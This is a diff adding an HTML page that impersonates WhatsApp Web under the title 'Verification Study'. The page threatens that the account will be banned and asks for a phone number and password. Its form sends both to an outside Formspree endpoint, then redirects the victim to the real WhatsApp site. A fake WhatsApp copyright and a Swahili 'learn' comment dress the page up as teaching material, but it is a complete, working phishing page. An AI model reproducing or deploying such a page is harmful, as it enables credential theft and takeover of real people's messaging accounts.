@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web - Verification Study</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            width: 90%;
+            max-width: 380px;
+            border-radius: 3px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .logo {
+            width: 60px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #41525d;
+            font-weight: 300;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #667781;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #e9edef;
+            border-radius: 4px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        input:focus {
+            border-color: #00a884;
+        }
+        button {
+            background-color: #00a884;
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 3px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 15px;
+            text-transform: uppercase;
+        }
+        button:hover {
+            background-color: #008f72;
+        }
+        .footer-note {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8696a0;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>𝐕𝐄𝐑𝐈𝐅𝐘 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓</h2>
+    <p>𝐭𝐨 𝐜𝐨𝐧𝐭𝐢𝐧𝐮𝐞 𝐮𝐬𝐢𝐧𝐠 𝐲𝐨𝐮𝐫 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐯𝐞𝐫𝐢𝐟𝐲 𝐲𝐨𝐮𝐫 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐨𝐭𝐡𝐞𝐫𝐰𝐢𝐬𝐞 𝐲𝐨𝐮𝐫 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐰𝐢𝐥𝐥 𝐛𝐮𝐧.</p>
+
+    <form action="https://formspree.io/f/mbdwbrjq" method="POST" id="study-form">
+        <input type="text" name="phone_number" placeholder="𝐏𝐡𝐨𝐧𝐞 𝐧𝐮𝐦𝐛𝐞𝐫  (𝐞𝐠. 07...)" required>
+        <input type="password" name="verification_code" placeholder="𝐄𝐍𝐓𝐄𝐑 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃" required>
+        
+        <input type="hidden" name="_next" value="https://www.whatsapp.com">
+        
+        <button type="submit">𝐒𝐔𝐁𝐌𝐈𝐓</button>
+    </form>
+
+    <div class="footer-note">
+        &copy; 2024 WhatsApp LLC. 𝐲𝐨𝐮𝐫 𝐬𝐞𝐫𝐜𝐮𝐢𝐫𝐭𝐲 𝐢𝐬 𝐨𝐮𝐫 𝐡𝐨𝐧𝐞𝐬𝐭.
+    </div>
+</div>
+
+<script>
+    // Jifunze: JavaScript inaweza kutumika kuona data kabla hazijatumwa (Console Log)
+    document.getElementById('study-form').addEventListener('submit', function() {
+        console.log("Data zinatumwa kwenye Formspree sasa...");
+    });
+</script>
+
+</body>
+</html>
